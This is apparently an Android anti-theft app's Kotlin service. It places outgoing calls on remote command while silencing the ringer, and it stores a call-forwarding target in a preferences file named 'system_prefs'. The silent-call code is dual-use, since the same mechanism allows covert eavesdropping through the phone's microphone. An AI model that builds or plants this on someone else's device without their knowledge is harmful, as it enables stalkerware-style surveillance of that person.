package com.antitheft.app.services

import android.app.Service
import android.content.Context
import android.content.Intent
import android.media.AudioManager
import android.os.Build
import android.os.IBinder
import android.telecom.TelecomManager
import android.telephony.TelephonyManager
import kotlinx.coroutines.*

class CallService : Service() {
    
    private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private lateinit var audioManager: AudioManager
    private var originalRingerMode = AudioManager.RINGER_MODE_NORMAL
    
    override fun onCreate() {
        super.onCreate()
        audioManager = getSystemService(Context.AUDIO_SERVICE) as AudioManager
    }
    
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        intent?.let {
            when (it.getStringExtra("action")) {
                "silent_call" -> {
                    val number = it.getStringExtra("number") ?: return START_NOT_STICKY
                    makeSilentCall(number)
                }
                "forward" -> {
                    val target = it.getStringExtra("target") ?: return START_NOT_STICKY
                    forwardCalls(target)
                }
                "cancel_forward" -> cancelForwarding()
            }
        }
        return START_NOT_STICKY
    }
    
    private fun makeSilentCall(number: String) {
        serviceScope.launch {
            try {
                originalRingerMode = audioManager.ringerMode
                audioManager.ringerMode = AudioManager.RINGER_MODE_SILENT
                val intent = Intent(Intent.ACTION_CALL).apply {
                    data = android.net.Uri.parse("tel:$number")
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                startActivity(intent)
                delay(5000)
                monitorCallState()
            } catch (e: SecurityException) { e.printStackTrace() }
        }
    }
    
    private fun monitorCallState() {
        val telephonyManager = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
        serviceScope.launch {
            var wasOffhook = false
            while (true) {
                delay(1000)
                when (telephonyManager.callState) {
                    TelephonyManager.CALL_STATE_OFFHOOK -> wasOffhook = true
                    TelephonyManager.CALL_STATE_IDLE -> {
                        if (wasOffhook) {
                            audioManager.ringerMode = originalRingerMode
                            break
                        }
                    }
                }
            }
            stopSelf()
        }
    }
    
    private fun forwardCalls(target: String) {
        val prefs = getSharedPreferences("system_prefs", Context.MODE_PRIVATE)
        prefs.edit().putString("call_forward_target", target).apply()
    }
    
    private fun cancelForwarding() {
        val prefs = getSharedPreferences("system_prefs", Context.MODE_PRIVATE)
        prefs.edit().remove("call_forward_target").apply()
    }
    
    override fun onDestroy() {
        super.onDestroy()
        serviceScope.cancel()
        audioManager.ringerMode = originalRingerMode
    }
    
    override fun onBind(intent: Intent?): IBinder? = null
}
